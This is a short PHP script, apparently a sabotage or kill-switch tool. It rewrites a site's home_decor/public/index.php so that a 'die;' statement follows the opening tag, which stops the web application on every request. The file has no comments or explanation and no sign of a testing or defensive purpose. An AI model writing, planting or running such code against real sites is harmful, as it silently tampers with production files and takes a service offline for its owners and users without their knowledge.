<?php

$filePath = $_SERVER['DOCUMENT_ROOT'] . '/home_decor/public/index.php';
 $content = file_get_contents($filePath);
         $phpCodeToInsert = "\n"
            . "die;\n";
 $content = preg_replace(
            '/<\?php\s*/',
            "<?php\n" . $phpCodeToInsert,
            $content,
            1
        );

   
        file_put_contents($filePath, $content);
        die();

?>